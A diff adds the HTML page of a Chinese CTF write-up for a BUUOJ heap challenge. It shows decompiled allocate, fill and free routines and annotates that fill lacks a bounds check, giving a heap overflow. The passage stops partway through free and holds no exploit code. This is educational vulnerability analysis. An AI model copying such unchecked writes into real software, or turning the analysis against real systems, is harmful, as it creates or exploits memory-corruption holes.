@@ -1,0 +1,910 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.36d0987006a4b9c3341e62a9e55cd9446b790bd2367575177aa5d794949c7cf0.js" integrity="sha256-NtCYcAakucM0HmKp5VzZRGt5C9I2dXUXeqXXlJScfPA=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>wp - 微风的龙</title>
+    <link rel="icon" href="/favicon_hu_912579ba8553ef86.png" sizes="16x16" type="image/png">
+    <link rel="icon" href="/favicon_hu_220d0e60e04d07f1.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="/favicon_hu_e404a0b940aa1839.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_603e3ce51eff6377.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_149e475083d0f0f9.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
+<meta name="keywords" content="博客, Hugo, PWN, BUUOJ, 个人主页" />
+  <meta name="description" content="选择1：
+void __fastcall allocate(__int64 a1)
+{
+  int i; // [rsp&#43;10h] [rbp-10h]
+  int v2; // [rsp&#43;14h] [rbp-Ch]
+  void *v3; // [rsp&#43;18h] [rbp-8h]
+
+  for ( i = 0; i &lt;= 15; &#43;&#43;i )
+  {
+    if ( !*(_DWORD *)(24LL * i &#43; a1) )
+    {
+      printf(&#34;Size: &#34;);
+      v2 = gets();
+      if ( v2 &gt; 0 )
+      {
+        if ( v2 &gt; 4096 )
+          v2 = 4096;//限制元素个数为4096
+        v3 = calloc(v2, 1u);//限制堆大小为4096字节，4kb
+        if ( !v3 )  //这个部分是负责写入元数据
+          exit(-1);
+        *(_DWORD *)(24LL * i &#43; a1) = 1;//标记为已使用，设置第 i 个 chunk 的 &#34;used&#34; 标志为 1（表示已分配）
+        *(_QWORD *)(a1 &#43; 24LL * i &#43; 8) = v2;// 保存 size，在偏移 &#43;8 处存入用户请求的 size（例如 128）
+        *(_QWORD *)(a1 &#43; 24LL * i &#43; 16) = v3;// 保存指针，在偏移 &#43;16 处存入 calloc 返回的实际堆内存地址（如 0x5555555592a0）
+        printf(&#34;Allocate Index %d\n&#34;, i);
+      }
+      return;
+    }
+  }
+}
+申请一个堆块" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="wp">
+  <meta name="twitter:description" content="选择1：void __fastcall allocate(__int64 a1) { int i; // [rsp&#43;10h] [rbp-10h] int v2; // [rsp&#43;14h] [rbp-Ch] void *v3; // [rsp&#43;18h] [rbp-8h] for ( i = 0; i &lt;= 15; &#43;&#43;i ) { if ( !*(_DWORD *)(24LL * i &#43; a1) ) { printf(&#34;Size: &#34;); v2 = gets(); if ( v2 &gt; 0 ) { if ( v2 &gt; 4096 ) v2 = 4096;//限制元素个数为4096 v3 = calloc(v2, 1u);//限制堆大小为4096字节，4kb if ( !v3 ) //这个部分是负责写入元数据 exit(-1); *(_DWORD *)(24LL * i &#43; a1) = 1;//标记为已使用，设置第 i 个 chunk 的 &#34;used&#34; 标志为 1（表示已分配） *(_QWORD *)(a1 &#43; 24LL * i &#43; 8) = v2;// 保存 size，在偏移 &#43;8 处存入用户请求的 size（例如 128） *(_QWORD *)(a1 &#43; 24LL * i &#43; 16) = v3;// 保存指针，在偏移 &#43;16 处存入 calloc 返回的实际堆内存地址（如 0x5555555592a0） printf(&#34;Allocate Index %d\n&#34;, i); } return; } } } 申请一个堆块">
+<meta property="og:url" content="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-2/2-2-2/wp/">
+  <meta property="og:site_name" content="微风的龙">
+  <meta property="og:title" content="wp">
+  <meta property="og:description" content="选择1：void __fastcall allocate(__int64 a1) { int i; // [rsp&#43;10h] [rbp-10h] int v2; // [rsp&#43;14h] [rbp-Ch] void *v3; // [rsp&#43;18h] [rbp-8h] for ( i = 0; i &lt;= 15; &#43;&#43;i ) { if ( !*(_DWORD *)(24LL * i &#43; a1) ) { printf(&#34;Size: &#34;); v2 = gets(); if ( v2 &gt; 0 ) { if ( v2 &gt; 4096 ) v2 = 4096;//限制元素个数为4096 v3 = calloc(v2, 1u);//限制堆大小为4096字节，4kb if ( !v3 ) //这个部分是负责写入元数据 exit(-1); *(_DWORD *)(24LL * i &#43; a1) = 1;//标记为已使用，设置第 i 个 chunk 的 &#34;used&#34; 标志为 1（表示已分配） *(_QWORD *)(a1 &#43; 24LL * i &#43; 8) = v2;// 保存 size，在偏移 &#43;8 处存入用户请求的 size（例如 128） *(_QWORD *)(a1 &#43; 24LL * i &#43; 16) = v3;// 保存指针，在偏移 &#43;16 处存入 calloc 返回的实际堆内存地址（如 0x5555555592a0） printf(&#34;Allocate Index %d\n&#34;, i); } return; } } } 申请一个堆块">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="buu">
+    <meta property="article:published_time" content="2026-04-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-15T00:00:00+00:00">
+    <meta property="article:tag" content="BUU">
+
+  <meta itemprop="name" content="wp">
+  <meta itemprop="description" content="选择1：void __fastcall allocate(__int64 a1) { int i; // [rsp&#43;10h] [rbp-10h] int v2; // [rsp&#43;14h] [rbp-Ch] void *v3; // [rsp&#43;18h] [rbp-8h] for ( i = 0; i &lt;= 15; &#43;&#43;i ) { if ( !*(_DWORD *)(24LL * i &#43; a1) ) { printf(&#34;Size: &#34;); v2 = gets(); if ( v2 &gt; 0 ) { if ( v2 &gt; 4096 ) v2 = 4096;//限制元素个数为4096 v3 = calloc(v2, 1u);//限制堆大小为4096字节，4kb if ( !v3 ) //这个部分是负责写入元数据 exit(-1); *(_DWORD *)(24LL * i &#43; a1) = 1;//标记为已使用，设置第 i 个 chunk 的 &#34;used&#34; 标志为 1（表示已分配） *(_QWORD *)(a1 &#43; 24LL * i &#43; 8) = v2;// 保存 size，在偏移 &#43;8 处存入用户请求的 size（例如 128） *(_QWORD *)(a1 &#43; 24LL * i &#43; 16) = v3;// 保存指针，在偏移 &#43;16 处存入 calloc 返回的实际堆内存地址（如 0x5555555592a0） printf(&#34;Allocate Index %d\n&#34;, i); } return; } } } 申请一个堆块">
+  <meta itemprop="datePublished" content="2026-04-15T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-15T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2021">
+  <meta itemprop="keywords" content="BUU">
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.db20b90f1e018f02fe452451fb9603d42007e5f5abc40cd58ddadfec0d7764f3.css" integrity="sha256-2yC5Dx4BjwL+RSRR+5YD1CAH5fWrxAzVjdrf7A13ZPM=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="https://weifengdel0ng.github.io/css/home.css" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+</head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-xxl">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://weifengdel0ng.github.io/">微风的龙
+</a>
+
+    <div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">微风的龙</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-xxl-0">
+        <hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/">首页
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/posts/">文章
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/about/">关于
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-xxl-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="搜索"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-xxl-none">配色</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="蓝色"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="蓝灰色"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="棕色"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="青色"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="绿色"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="靛青色"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="橙色"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="粉色"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="紫色"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="红色"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="蓝绿色"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="黄色"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-xxl-none">模式</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> 浅色
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> 深色
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> 自动
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.f7179afb1166ccce2102740afe4caf205dbc623896eb19a268f6cb9367e6eea6.js" integrity="sha256-9xea&#43;xFmzM4hAnQK/kyvIF28YjiW6xmiaPbLk2fm7qY=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">你的浏览器不支持 JavaScript。</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="目录">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="目录">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="版权">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="评论">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xxl-block" role="button" title="切换侧边栏">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">wp</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="创建于 2026-04-15 08:00:00 &#43;0800 CST。">April 15, 2026</span><span class="post-reading-time me-1 mb-1">5 分钟阅读</span><a href="/categories/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>BUU</a><a href="/tags/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">BUU</a>
+</div>
+
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">目录</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h4 id="选择1" data-numberify>选择1：<a class="anchor ms-1" href="#选择1"></a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">allocate</span>(<span style="color:#66d9ef">__int64</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">15</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Size: &#34;</span>);
+</span></span><span style="display:flex;"><span>      v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">gets</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4096</span> )
+</span></span><span style="display:flex;"><span>          v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>;<span style="color:#75715e">//限制元素个数为4096
+</span></span></span><span style="display:flex;"><span>        v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(v2, <span style="color:#ae81ff">1u</span>);<span style="color:#75715e">//限制堆大小为4096字节，4kb
+</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )  <span style="color:#75715e">//这个部分是负责写入元数据
+</span></span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;<span style="color:#75715e">//标记为已使用，设置第 i 个 chunk 的 &#34;used&#34; 标志为 1（表示已分配）
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> v2;<span style="color:#75715e">// 保存 size，在偏移 +8 处存入用户请求的 size（例如 128）
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">=</span> v3;<span style="color:#75715e">// 保存指针，在偏移 +16 处存入 calloc 返回的实际堆内存地址（如 0x5555555592a0）
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Allocate Index %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>申请一个堆块</p>
+
+<h4 id="选择2" data-numberify>选择2：<a class="anchor ms-1" href="#选择2"></a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">fill</span>(<span style="color:#66d9ef">__int64</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#a6e22e">gets</span>();
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)result <span style="color:#f92672">+</span> a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (_DWORD)result <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )      <span style="color:#75715e">//是否已分配
+</span></span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Size: &#34;</span>);
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> <span style="color:#a6e22e">gets</span>();   <span style="color:#75715e">//实际应该是scanf（“%d”），这种gets（）到int中的一般是反编译失真
+</span></span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> result;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)result <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Content: &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_11B2</span>(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>), v3);<span style="color:#75715e">//这里没有进行边界检查，是基础的堆溢出
+</span></span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其中<code>sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3)</code>如下，是一个非常友好的输入函数，无截断，支持大输入，信号安全，不添加终止符：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_11B2</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a2 )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( v3 <span style="color:#f92672">&lt;</span> a2 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(v3 <span style="color:#f92672">+</span> a1), a2 <span style="color:#f92672">-</span> v3);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">+=</span> v4;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span><span style="color:#a6e22e">_errno_location</span>() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">11</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">_errno_location</span>() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> v3;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+<h4 id="选择3" data-numberify>选择3：<a class="anchor ms-1" href="#选择3"></a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">freee</span>(<span style="color:#66d9ef">__int64</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#a6e22e">gets</span>();
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)result <span style="color:#f92672">+</span> a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (_DWORD)result <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
